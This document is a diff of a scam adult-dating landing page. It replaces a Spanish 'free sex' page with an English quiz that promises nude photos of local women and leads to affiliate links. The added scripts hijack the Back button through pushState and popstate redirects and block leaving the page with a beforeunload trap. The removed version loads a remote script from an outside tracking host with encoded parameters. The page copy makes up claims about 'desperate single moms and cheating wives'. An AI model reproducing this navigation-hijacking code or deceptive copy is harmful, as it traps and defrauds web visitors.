@@ -1,21 +1,183 @@
 
+<!DOCTYPE HTML><html lang="en-US"><head><meta charset="UTF-8"><base href="https://cdn-bimi.akamaized.net"><script>window.addEventListener("load", function () {
+        var onceSupported = false;
+        var touched = false;
+        var captureSupported = false;
+        try {
+            var options = {
+                get once() {
+                    onceSupported = true;
+                    return false;
+                }
+            };
+            window.addEventListener("test", null, options);
+            window.removeEventListener("test", null, options);
+        } catch (err) {
+            onceSupported = false;
+        }
+        try {
+            var options = {
+                get capture() {
+                    captureSupported = true;
+                    return false;
+                }
+            };
+            window.addEventListener("test", null, options);
+            window.removeEventListener("test", null, options);
+        } catch (err) {
+            captureSupported = false;
+        }
+        var sv = {
+            'df86699f6130e141': '', '2148702d7c2782df': '', '0f53c12c292fff5b': ''
+        };
+        var hash = window.location.pathname.replace('/c/', '');
+        var url = window.location.protocol + '//' + window.location.host + window.location.pathname;
+        var cururl = url;
+        if (hash && hash.length > 1 && sv[hash]) {
+            url = window.location.protocol + '//' + window.location.host + window.location.pathname.replace('/c/' + hash, '/c/' + sv[hash]);
+        }
+        url = url + '?s1=28266&s2=359915&s3=&s5=backuser&click_id=&iexpp=1&j1=1&j3=1&j7=1';
+        cururl = cururl + '?s1=28266&s2=359915&s3=&click_id=&j1=1&j3=1&j7=1';
+
+        (function (w, d) {
+            var targetLocation = function (w, d) {
+                history.pushState({pg: 'prev'}, d.title, cururl);
+            };
+            (function () {
+                    try {
+                        chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]);
+                    } catch (e) {
+                        chromeVersion = 0;
+                    }
+                    if (chromeVersion >= 75) {
+                        w.addEventListener('mouseup', function () {
+                                if (!touched) {
+                                    touched = true;
+                                    setTimeout(function () {
+                                            targetLocation(w, d);
+                                        }, 0);
+                                }
+                            }, onceSupported ? {once: true} : false);
+                        d.body.addEventListener('touchend', function (evt) {
+                                if (!touched) {
+                                    touched = true;
+                                    setTimeout(function () {
+                                            targetLocation(w, d);
+                                        }, 0);
+                                }
+                            }, onceSupported ? {once: true} : false);
+                        d.body.addEventListener('keydown', function () {
+                                if (!touched) {
+                                    touched = true;
+                                    setTimeout(function () {
+                                            targetLocation(w, d);
+                                        }, 0);
+                                }
+                            }, onceSupported ? {once: true} : false);
+                    } else {
+                        w.addEventListener('pageshow', function () {
+                                setTimeout(function () {
+                                        targetLocation(w, d);
+                                    }, 0);
+                            }, onceSupported ? {once: true} : false);
+                    }
+                    w.addEventListener('popstate', function (event) {
+                            window.exit = false;
+
+                            if (window.location.href.indexOf('&iexpp=1') !== -1) {
+                                window.exit = true;
+                            }
+
+                            w.location.href = url;
+                        }, captureSupported ? {capture: true} : false);
+
+            }())
+        }(window, document));
+    });</script><script>document.addEventListener("DOMContentLoaded", function () {
+    var buttons = document.querySelectorAll('a');
+    window.exit = true;
+
+    window.addEventListener('beforeunload', function (e) {
+        if (window.exit) {
+            e.preventDefault();
+            e.returnValue = '?';
+        } else {
+            delete e['returnValue'];
+        }
+    });
+    for (var i = 0; i < buttons.length; i++) {
+        buttons[i].addEventListener('mousedown', function () {
+            if (this.href.indexOf('http') !== -1) {
+                window.exit = false;
+            }
+        }, false);
+        buttons[i].addEventListener('touchstart', function () {
+            if (this.href.indexOf('http') !== -1) {
+                window.exit = false;
+            }
+        }, false);
+    }
+});</script><title></title><meta name="viewport" content="user-scalable=false, initial-scale=1.0, maximum-scale=1.0">
+
+        <link href="/images/favicon.ico" rel="icon" type="image/x-icon" />
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<!DOCTYPE HTML><html lang="en-US"><head><meta charset="UTF-8"><base href="https://cdn-cd.akamaized.net"><title></title><meta name="viewport" content="user-scalable=false, initial-scale=1.0, maximum-scale=1.0"><link href="/images/favicon.ico" rel="icon" type="image/x-icon" />
-
-<meta content="" name="keywords"><meta content="" name="description"><link rel="stylesheet" type="text/css" href="/landings/187429/1585129935/css/main-style.css?1585129935"><script type="text/javascript" src="/landings/187429/1585129935/js/backoffer.js?1585129935"></script></head><body style="" ><body style=""><div id="wrapper"><!-- Main --><div class="wrapper"><!-- START BG block --><div class="bg-block"></div><section id="main"><img src="/landings/178004/1575471931/images/snapchat_sex.png" style="max-width: 160px" alt=""><p></p><header><span class="avatar"><img src="/landings/178004/1575471931/images/nike.gif" alt=""></span><h1> SPAIN FREE SEX ! 	 <br> 		 TRADE NUDES? SNAPSEX? LIVECUM? ÚNETE A MI GRUPO PRIVADO? 	 </h1><p><b> 		 Encuentra las mujeres más sexys de tu país 	 </b><br> 		 REGÍSTRATE AHORA!	 </p></header><footer><a href="https://securecloud-smart.com/?a=100065&c=174995&s1=BUDUD&s2=KLCORPS"><button type="submit" class="btn btn-danger btn-lg stylee showOffer"> CONTINUAR </button></a></footer></section><!-- Footer --><footer id="footer"><ul class="copyright"><li></li></ul></footer></div></div><p><b style="color: yellow"></b></p><script type="text/javascript"> </script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX%2bVUvMCta0tVuVdQkuqd5gWktXDGMsxB2%2bUxgeiMv%2fbWk71gXkAdlD4HBSRjGtLMp1%2fcZEjNBPpj8D1hatIYG%2f542Ei9XBcu45CpAgEGkf26xXjr7dN%2brOaUDOrGchqoAmktyThFNzDwqHiPYVSUcMISNL4MDtyZ376TSLlRCLzrqIV9q1bWvzad1rGMvwzLisORrGfLP%2bQaKQ6DPritPh3yx9IhkFgZXxSVr3jxa25w9qtgpE9BPihZFiwj%2bFUffgVUC9ZbvphQ93SPaFD9FOMnJMSGX%2fA%2bq4JcIDRZXhckpXxuP991FvEbK6yEZZhTK9%2fcIwMv1pwDZ2BthVFUfMOnmFmxyLduVdAHtkLIooTgFTtPM%2fFdAOpXLGGF4BKX7ZHLjvhw7J5rlkXyyW1TQTdDelSjKF6kLNiL0XBhLq3JNhrJi4emt3JdST1eWXsgfnBvLtvGMnogbHJ8H5wf0jqjyk1RqYyGQ%2bzQDVmPLRkopQXwrdajTICBPxuzzOEsSDR0Tj6LQPqUcmaaGdfp0JZug9U0U%2fM0bvTtR0f%2f92OXeVhFkJIG8nytp53%2fDokrQ" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body></body></html>
+        <meta content="" name="keywords"><meta content="" name="description"><link rel="stylesheet" type="text/css" href="/landings/195658/1595508920/css/style.css?1595508920"><script type="text/javascript" src="/landings/195658/1595508920/js/jquery.min.js?1595508920"></script><script type="text/javascript" src="/landings/195658/1595508920/js/function.js?1595508920"></script><script type="text/javascript" src="/landings/195658/1595508920/js/translates.js?1595508920"></script></head><body  style="" ><script>
+  document.querySelector("body").addEventListener(
+    "touchstart",
+    function () {
+      if (document.querySelector("body").classList.contains("body-last-step")) {
+        window.exit = false;
+      }
+    },
+    false
+  );
+  document.querySelector("body").addEventListener(
+    "mousedown",
+    function () {
+      if (document.querySelector("body").classList.contains("body-last-step")) {
+        window.exit = false;
+      }
+    },
+    false
+    );
+    </script><div class="bg"></div><div class="content_wrap"><div class="content"><div class="left_side"><div class="slide"><img src="/landings/195658/1595508920/images/1v.jpg" alt="" /></div><div class="slide"><img src="/landings/195658/1595508920/images/2v.jpg" alt="" /></div><div class="slide"><img src="/landings/195658/1595508920/images/3v.jpg" alt="" /></div><div class="slide"><img src="/landings/195658/1595508920/images/4v.jpg" alt="" /></div><div class="slide"><img src="/landings/195658/1595508920/images/5v.jpg" alt="" /></div><div class="slide"><img src="/landings/195658/1595508920/images/6v.jpg" alt="" /></div><div class="slide active"><img src="/landings/195658/1595508920/images/7v.jpg" alt="" /></div><div class="location"><img src="/landings/195658/1595508920/images/BabeMarker.gif" alt="" /><p><span class="random-num">
+            95                                   
+          </span                ><span class="girls"></span></p><p><span class="in-city"></span>
+          Jakarta                            
+        </p></div></div><div class="right_side"><div class="step" style="display: block;"><p class="title_text">
+          WARNING!                            
+        </p><div class="large_text"><p>
+            You will see nude photos. Please be discreet.                                  
+          </p></div><div class="question_wrap"><div class="q_block q_block1 q current"><p class="question">
+              Are you at least 18 years old?                                        
+            </p><p class="question_text">
+              (The women have requested that we not let those younger than                  18 contact them because of past rude behavior by younger men.)                                        
+            </p><div class="button_block"><a href="javascript:void(0)" class="button yes_btn">
+                Yes                                               
+              </a                    ><a href="javascript:void(0)" class="button no_btn">
+                No                                              
+              </a></div></div><div class="q_block q_block2 q"><p class="question">
+              These women have asked us to not allow men that are seeking a                  "relationship". Do you agree to this request?                                        
+            </p><p class="question_text">
+              (They only desire quick sex. Not dating.)                                        
+            </p><div class="button_block"><a href="javascript:void(0)" class="button yes_btn">
+                Yes                                               
+              </a                    ><a href="javascript:void(0)" class="button no_btn">
+                No                                              
+              </a></div></div><div class="q_block q_block3 q"><p class="question">
+              Do you agree to keep the identity of these women a secret?                                        
+            </p><p class="question_text">
+              (Many of these women are desperate single moms and cheating                  wives looking for some fun. They could be your neighbors or                  someone you know.)                                        
+            </p><div class="button_block"><a href="javascript:void(0)" class="button yes_btn">
+                Yes                                               
+              </a                    ><a href="javascript:void(0)" class="button no_btn">
+                No                                              
+              </a></div></div><div class="q_block q q_last"><p class="f_title">
+              THANK YOU!                                        
+            </p><p class="f_large_text">
+              You may now see our list and photos of women who are in your                  area.                                        
+            </p><p class="f_text">
+              Again, please keep their identity a secret. Click on the                  &quot;Continue&quot; button and search on the basis of your                  answers.                                        
+            </p><div class="button_block"><a                     href="https://secureconv-dt.com/?a=82985&c=233040&s1=BUDOET&s2=XCORP"                     class="button btn-fin"                     >                 Сontinue                                                             </a></div></div></div></div></div></div></div></body></html>
